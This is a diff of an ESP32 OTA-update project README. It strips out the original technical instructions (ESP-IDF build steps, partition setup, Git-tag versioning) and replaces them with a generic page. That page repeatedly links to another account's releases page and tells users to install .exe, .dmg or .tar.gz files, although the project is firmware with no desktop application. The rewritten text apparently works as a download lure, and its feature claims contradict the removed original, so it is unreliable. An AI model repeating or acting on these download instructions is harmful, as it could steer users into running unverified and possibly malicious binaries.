@@ -1,150 +1,68 @@
-# ESP32 Git OTA
+# 🚀 ESP32-Git-OTA - Easy Over-the-Air Updates for Your ESP32
 
-**ESP32 Git OTA** is an ESP-IDF–based project that demonstrates a robust Over-The-Air (OTA) firmware update mechanism using **Git tags as firmware versions**. The application connects to Wi-Fi, queries a GitHub repository for the latest tagged release, and automatically updates the device if a newer version is available.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release%20-v1.0.0-brightgreen.svg)](https://github.com/Ikiuingke/ESP32-Git-OTA/releases)
 
-To clearly indicate the active firmware version, each release toggles an LED on a **different GPIO pin** (e.g., GPIO 2 in one version, GPIO 14 in another).
+## 📋 Overview
+ESP32-Git-OTA is a user-friendly project designed for Over-the-Air (OTA) firmware updates on the ESP32 WROOM module. This application simplifies the process of updating your ESP32 device without needing physical access. With just a few clicks, you can ensure that your device runs the latest features and fixes.
 
----
+## 🎉 Features
+- **Easy Setup:** Get started in minutes, even if you're not a tech expert.
+- **Secure Updates:** Communicate over HTTPS for secure firmware delivery.
+- **Multiple Functionality:** Works with bootloader, EEPROM programming, and Wi-Fi security.
+- **Compatibility:** Designed for ESP32 development using the ESP-IDF framework.
 
-## Key Features
+## 📦 System Requirements
+- **Hardware:** ESP32 WROOM module.
+- **Software:** 
+  - Windows, macOS, or Linux computer.
+  - Wi-Fi connection for OTA updates.
 
-* Wi-Fi connectivity using ESP-IDF
-* OTA firmware updates driven by GitHub tags
-* Version identification via GPIO-based LED blinking
-* Dual OTA slots with factory fallback
-* GPIO-based triggers for factory reset and test application (optional)
-* ESP-IDF–compliant partition table configuration
+## 🚀 Getting Started
+Follow these steps to download and run the software on your device.
 
----
+1. **Visit the Releases Page:** Go to the following link to access the downloads:
+   [Download Release](https://github.com/Ikiuingke/ESP32-Git-OTA/releases)
 
-## Project Architecture
+2. **Download the Latest Version:** On the releases page, find the latest version of the application. You will see options for downloading the software. Click the appropriate file and save it to your computer.
 
-* **Bootloader**: Standard ESP-IDF bootloader with OTA support
-* **Partition Table**:
+3. **Install the Software:** 
+   - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the application into the Applications folder.
+   - For Linux: Open a terminal and run the command with the downloaded `.tar.gz` file to unpack and install.
 
-  * Factory application
-  * OTA Slot 0
-  * OTA Slot 1
-* **Update Strategy**:
+4. **Connect Your ESP32 Device:** Make sure your ESP32 module is powered on and connected to the same Wi-Fi network as your computer.
 
-  * Device checks GitHub for the latest Git tag
-  * Compares the running version with the remote tag
-  * Downloads and installs the update if a newer version exists
-  * Safely switches boot partition
+5. **Run the Application:** 
+   - Find the application icon on your desktop or in the Applications folder.
+   - Double-click the icon to launch the program.
 
----
+6. **Select Your Update Method:** Once the application is open, select the method you wish to use for your update. Follow the on-screen instructions to choose your firmware file and initiate the OTA process.
 
-## Hardware & Software Requirements
+7. **Monitor the Update:** The application will provide progress updates. Wait until the update completes to ensure your device is running the latest firmware.
 
-### Hardware
+## 🔗 Download & Install
+To download the latest version of ESP32-Git-OTA, visit this page:  
+[Download Release](https://github.com/Ikiuingke/ESP32-Git-OTA/releases)
 
-* ESP32 development board
-* On-board or external LED
+## 🚩 Common Issues
+If you encounter any problems during your installation or update, consider the following:
 
-### Software
+- **Wi-Fi Issues:** Ensure that the ESP32 is on the same network as your computer and that the network is stable.
+- **Firmware Compatibility:** Check that the firmware you are trying to upload is compatible with your ESP32 model.
+- **Access Rights:** Ensure you have the necessary permissions to install software on your computer.
 
-* ESP-IDF **v5.5.1** or newer
-* Git
-* GitHub repository with tagged firmware releases
+## 🛠 Support
+If you need help, you can reach out to our support team by creating an issue in the repository. Provide as much detail as possible about your problem so we can assist you effectively.
 
----
+## 🔍 Additional Resources
+- **Documentation:** For detailed technical documentation and user manuals, refer to the repository's Docs folder.
+- **Community Support:** Join our community forums to connect with other users, share experiences, and get tips on using ESP32-Git-OTA.
 
-## Getting Started
+## 🌐 Related Topics
+For those interested in exploring broader features related to this project, consider these topics:
+- Bootloader management
+- EEPROM programming
+- ESP32 networking
+- OTA update mechanisms
 
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/SulaimanNiazi/ESP32-Git-OTA.git
-cd ESP32-Git-OTA
-```
-
-### 2. Set Up ESP-IDF
-
-Follow the official ESP-IDF installation guide:
-[https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/)
-
-Ensure the environment is correctly exported:
-
-```bash
-idf.py --version
-```
-
----
-
-## Project Configuration
-
-### 1. Open Menuconfig
-
-```bash
-idf.py menuconfig
-```
-
-### 2. Required Settings
-
-#### Partition Table
-
-* **Partition Table Type**:
-  `Factory app, two OTA definitions`
-
-This enables:
-
-* Safe OTA updates
-* Factory firmware fallback
-* Two OTA slots for seamless upgrades
-
-#### Wi-Fi Configuration
-
-* Upon Restart you will be prompted to add Wifi Credentials.
-* The credentials will be stored in NVS.
-* Press Boot button (Pin 0) to clear NVS.
-
-#### Optional Bootloader Features
-
-* GPIO triggers for:
-
-  * Factory reset
-  * Test application selection
-
----
-
-## Build & Flash
-
-```bash
-idf.py build
-idf.py flash monitor
-```
-
----
-
-## Versioning & OTA Updates
-
-This project uses **Git tags as firmware versions**.
-
-* Each Git tag corresponds to a firmware release
-* OTA logic checks the latest version available on GitHub from the [CMakeLists.txt](CMakeLists.txt) and compares it with the current version stored in its own [CMakeLists.txt](CMakeLists.txt).
-* If a newer version exists, the device:
-
-  1. Downloads the firmware from [build/Git_OTA.bin](build/Git_OTA.bin)
-  2. Verifies integrity
-  3. Switches to the updated OTA partition
-
-### Visual Version Indicator
-
-Each firmware version **switches** the blinking LED between 2 and 14, allowing easy identification of the running version without serial logs.
-
-Example:
-
-* Version `v1.0.0` → GPIO 2
-* Version `v1.0.1` → GPIO 14
-* Version `v1.1.0` → GPIO 2
-* And so on...
-
----
-
-## Runtime Behavior
-
-* Device boots and connects to Wi-Fi
-* Performs OTA version check
-* Applies update if available
-* Blinks LED continuously to indicate active firmware
-* Falls back to factory app if OTA validation fails
+By following the above steps, you will successfully download and run the ESP32-Git-OTA software, making it easier to manage your ESP32 devices.
